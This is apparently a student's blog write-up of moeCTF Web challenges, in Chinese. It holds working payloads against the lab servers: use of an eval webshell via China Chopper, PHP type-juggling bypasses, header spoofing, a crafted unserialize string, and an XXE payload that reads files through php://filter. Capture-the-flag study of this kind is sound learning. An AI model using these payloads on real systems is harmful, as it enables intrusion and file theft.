---
title: 【moeCTF题解-0x06】Web
categories: 
- 计算机科学
- 网络安全
- CTF
- moeCTF
tags: 
- CTF
- Web
- Python
---

# 【moeCTF题解-0x06】Web

竟然AK了这部分，但也只是因为题目简单……

考虑到在XDSEC里选了web方向，也要好好学习web知识呀

<br/>



<!--more-->

<br/>

> **【moeCTF题解】总目录如下：**
>
> * [【moeCTF题解-0x00】序				（包括Sign in）](https://framist.github.io/2020/10/09/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x00%E3%80%91%E5%BA%8F/)
>
> * [【moeCTF题解-0x01】Reverse      （包括Android、IoT）](https://framist.github.io/2020/10/09/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x01%E3%80%91Reverse/)
> * [【moeCTF题解-0x02】Pwn](https://framist.github.io/2020/10/09/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91Pwn/)
> * [【moeCTF题解-0x03】Algorithm](https://framist.github.io/2020/10/12/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91Algorithm/)
> * [【moeCTF题解-0x04】Crypto          （包括 Classic Crypto）](https://framist.github.io/2020/10/12/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91Crypto/)
> * [【moeCTF题解-0x05】Misc](https://framist.github.io/2020/10/15/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91Misc/)
> * [【moeCTF题解-0x06】Web](https://framist.github.io/2020/10/25/%E3%80%90moeCTF%E9%A2%98%E8%A7%A3-0x06%E3%80%91Web/)

<br/>



# Web

11/11



## GET

> 50points
>
> http://web.moectf.online/GET/
>
> **Hint**
>
> [什么是GET?](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods)
>
> [如何GET?](https://www.wootec.top/2020/08/06/GET/)

打开靶机地址

```php
<?php 
error_reporting(0); 
highlight_file(__FILE__); 
include 'flag.php'; 



$a = $_GET['a']; 
if($a==flag) 
die ($flag);
```

URL后面加上`?a=flag`来GET传值

http://web.moectf.online/GET/?a=flag

打开得到flag`moectf{Y0u_kn0w_G4T_n0w}`

<br/>

## POST

> 50points
>
> http://web.moectf.online/POST/
>
> **Hints**
>
> 链接:
>
> [什么是POST?](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods)
>
> [如何POST?](https://www.wootec.top/2020/08/07/POST/)



```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include 'flag.php';



$a = $_POST['a'];
if($a==flag)
die ($flag); 
```

POST一个`a=flag`上去：

就得到flag：`moectf{Y0u_kn4w_p0st_n0w}`



>  这里我使用的是火狐开发者版与插件[HackBar V2](https://addons.mozilla.org/zh-CN/firefox/addon/hackbar-free/)来进行post的，轻量且适合小白

<br/>

## 小饼干

> 50points
>
> http://web.moectf.online/bis/

小饼干，就是cookie啦



浏览器-开发者工具栏-网络-Cookie 中可以查看cookie：

```
Cookie	"moectf{y0u_c4n't_e4t_thi3_c00k1e}"
```

得到flag：`moectf{y0u_c4n't_e4t_thi3_c00k1e}`

（响应头里面也有）

<br/>

## Introduction

> 50points
>
> 地址:
>
> - https://moectf.online/introduction
> - https://moectf.online/qa
>
> 你能找到flag嘛?

查看HTML源码，分别找到如下注释

```html
<!-- moectf{i_wAnt_2_ -->
<!-- jo1n_XDSEC!} -->
```

就是flag了。

<br/>

## 一句话

> 100points
>
> http://39.98.86.109:10000/
>
> 拿到flag就别乱搞了哦

打开网页：

```php
<?php
error_reporting(0);
highlight_file("index.php");
eval($_POST['a']);
?> 
```

发现里面已经内嵌了一句话木马`eval($_POST['a']);`

上久闻大名的[中国菜刀(China chopper)](http://www.maicaidao.com/)

![image-20201030212338263](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210624.png)

```bash
[/var/www/html/]$ ls -l ../../../
total 84
drwxr-xr-x   3 root root 4096 Feb 15  2016 app
drwxr-xr-x   1 root root 4096 Feb 15  2016 bin
drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
drwxr-xr-x   5 root root  340 Aug  4 03:21 dev
drwxr-xr-x   1 root root 4096 Aug  4 03:21 etc
-rw-r--r--   1 root root   40 Jun 17 16:22 flag
drwxr-xr-x   2 root root 4096 Apr 10  2014 home
drwxr-xr-x   1 root root 4096 Feb 15  2016 lib
drwxr-xr-x   2 root root 4096 Jan 19  2016 lib64
drwxr-xr-x   2 root root 4096 Jan 19  2016 media
drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
drwxr-xr-x   2 root root 4096 Jan 19  2016 opt
dr-xr-xr-x 186 root root    0 Aug  4 03:21 proc
drwx------   1 root root 4096 Aug  4 03:23 root
drwxr-xr-x   1 root root 4096 Aug  4 03:21 run
drwxr-xr-x   1 root root 4096 Jan 19  2016 sbin
drwxr-xr-x   2 root root 4096 Jan 19  2016 srv
dr-xr-xr-x  13 root root    0 Aug  4 03:21 sys
drwxr-xr-x   1 root root 4096 Feb 15  2016 usr
drwxr-xr-x   1 root root 4096 Feb 15  2016 var

[/var/www/html/]$ cat ../../../flag
moectf{0hhhh!!!y0u_know_h0w_to_u3e_eva1}
```

于是得到flag：`moectf{0hhhh!!!y0u_know_h0w_to_u3e_eva1}`

<br/>

## EzMath

> 150points
>
> http://39.98.86.109:10001/
>
> 简简单单数学题



```python
import requests
r = requests.Session()
s = r.post("http://39.98.86.109:10001/")
s.encoding = 'utf-8'
print(s.text)
print("====================")
for i in range(1):
    tet = s.text
    iAlg = tet.find("br>")
    alg = tet[iAlg+3:iAlg+15]
    iEqu = alg.find("=")
    alg = alg[:iEqu]

    print(alg,'============',str(eval(alg)))

    s = r.post('http://39.98.86.109:10001/', data={"a": (eval(alg))})
    s.encoding = 'utf-8'
    print(s.text)
```

得到flag：`moectf{MA7H_1s_s0_ea5y!!r1ght?}`

> 听说直接禁用JavaScript也可以？

<br/>

## 三心二意

> points
>
> http://39.97.238.171:8002/
>
> **Hint**
>
> 怀着三个等号的心，做了两个等号的事。

<br/>

```php
<?php 
$a = $_GET['a']; 
$b = $_POST['b']; 
$c = $_REQUEST['c']; 
$d = $_COOKIE['d']; 

if (!isset($a, $b, $c, $d)) { 
    highlight_file(__FILE__); 
} else { 
    if (is_numeric($a) and $a == false) { 
        echo 'A is OK!'; 
        echo '<br/>'; 
        if (!is_numeric($b) and $b == 0x125e591) { 
            echo 'B is OK!'; 
            echo '<br/>'; 
            if ($c != 240610708 and md5($c) == md5(240610708)) { 
                echo 'C is OK!'; 
                echo '<br/>'; 
                if (strlen($d) < 7 and $d != 0 and $d ** 2 == 0) { 
                    include('/flag'); 
                } else { 
                    echo "D is not wanted.<br/>"; 
                    highlight_file(__FILE__); 
                } 
            } else { 
                echo "C is not wanted.<br/>"; 
                highlight_file(__FILE__); 
            } 
        } else { 
            echo "Too young too simple.<br/>"; 
            highlight_file(__FILE__); 
        } 
    } else { 
        echo "A is not wanted.<br/>"; 
        highlight_file(__FILE__); 
    } 
} 
```



```python
import requests

header = {}
cookie = {'d':'1e-222'}
postpayload = {"b":"19260817a","c":"QNKCDZO"}
r = requests.post('http://39.97.238.171:8002/?a=0&c=QNKCDZO', data=postpayload, cookies=cookie) 

print(r.text[:100])#输出响应主体

# A is OK!<br/>B is OK!<br/>C is OK!<br/>moectf{PHP_1s_the_besT_lAngu@ge}
```

`moectf{PHP_1s_the_besT_lAngu@ge}`

## 俄罗斯头套

> 200points
>
> http://39.98.86.109:10002/
>
> 头

```
你的ip是：██████████████████████
不是127.0.0.1的话我可不会给你flag哦 
```





```
你的ip是：127.0.0.1
什么？你不是从"https://www.baidu.com"来的？那可不行... 
```



```
你的ip是：127.0.0.1
什么？你用的不是POST请求？那可不行... 
```



```
你的ip是：127.0.0.1
什么？你用的不是"supreme"浏览器？那可不行... 
```



```
Host: 39.98.86.109:10002
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://www.baidu.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: http://39.98.86.109:10002
Connection: keep-alive
Cookie: PHPSESSID=98rbnl919ufqd9s19fo5qbnom0
Upgrade-Insecure-Requests: 1
Server: supreme
X-Forwarded-For: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
```





`moectf{r3que5t_he4der_1s_ea5y!!}`

<br/>

## Moe include

> 200points
>
> http://web.moectf.online/include/

<br/>

```html
<a href="?file=hint.php">do not click</a>
```



```html

 <!DOCTYPE html>
 <html>
   <head>
     <title> </title>
   </head>
   <body>
     <!-- 你知道php伪协议吗-->
   </body>
 </html>

```

```php
<?php
error_reporting(E_ALL);
ini_set('open_basedir', '/var/www/moectf/include');
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('get out!');
}
if($file){
	include($file);
}else{
	echo '<a href="?file=hint.php">do not click</a>';
}
?>

```

`moectf{php_is_the_best_language}`

## Moe unserialize

> 250points
>
> http://web.moectf.online/unserialize/

<br/>

```
有一天，赤道企鹅在愉快的使用vim给学弟挖坑，突然伴随着身体的一阵抽搐，电脑死机了。企鹅悲痛欲绝，聪明的你能帮助企鹅找到他挖的坑吗？
```





```php
<?php
error_reporting(0);
class Moe {
    public $a;
    protected $b;
    private $c;


    function __destruct() {
        if ($this->a === '1' && $this->b === '2' && $this->c === '3') {
            include 'flag.php';
            die($flag);
        }
    }
}
$moe = $_GET['flag'];
unserialize($moe);
?>
    
有一天，赤道企鹅在愉快的使用vim给学弟挖坑，突然伴随着身体的一阵抽搐，电脑死机了。企鹅悲痛欲绝，聪明的你能帮助企鹅找到他挖的坑吗？

serialize()
<?php
class Moe {
    public $a;
    public $b;
    public $c;


    function __destruct() {
        if ($this->a === '1' && $this->b === '2' && $this->c === '3') {
            include 'flag.php';
            die($flag);
        }
    }
}
$m = new Moe;
$m->a = '1';
$m->b = '2';
$m->c = '3';
echo serialize($m);
?>
?flag=O:3:"Moe":3:{s:1:"a";s:1:"1";s:1:"b";s:1:"2";s:1:"c";s:1:"3";}
moectf{Y0u_4re_A_Moe}

仍有疑问：为什么能访问保护对象
```



[访问这个](http://web.moectf.online/unserialize/?flag=O:3:%22Moe%22:3:{s:1:%22a%22;s:1:%221%22;s:1:%22b%22;s:1:%222%22;s:1:%22c%22;s:1:%223%22;})

`moectf{Y0u_4re_A_Moe}`

## EzXXE

> 250points
>
> http://39.97.238.171:8001/

```php
<?php 
// flag is in '/flags/flag1.txt' and '/flags/flag2.php' 

libxml_disable_entity_loader (false); 
$xmlfile = file_get_contents('php://input'); 

if (strpos($xmlfile,"flag1.txt") !== FALSE){ 
    if (strpos($xmlfile,'file:/') === FALSE){ 
        die("Please use file protocol.<br/><br/>"); 
    } 
} 
if (strpos($xmlfile,"flag2.php") !== FALSE){ 
    if (strpos($xmlfile,'file:/') !== FALSE){ 
        echo "Why not try php://filter?"; 
        echo '<br/><br/>'; 
    } 
} 

$dom = new DOMDocument(); 
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);  
$test = simplexml_import_dom($dom); 
echo $test; 
highlight_file(__FILE__); 
?>
```





```python
# https://www.cnblogs.com/backlion/p/9302528.html
import requests
import base64
if __name__ == '__main__':
    url = 'http://39.97.238.171:8001/'

    xml = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flags/flag2.php">
    ]>
    <value>&xxe;</value>""" 
    req = requests.request(method='POST',url = url, data = xml)

    print(req.text)

# php://filter/read=convert.base64-encode/resource=/flags/flag2.php

print(base64.b64decode(b'PD9waHAgJGZsYWcyID0gJzRuZF9waHBfZjFsdDNyfSc7ID8+'))


# <value>是必须的 ， 其他的得 echo $xml->from;
# moectf{XXE_4nd_php_f1lt3r}
```



<br/>

<br/>



-----

*未完待续……*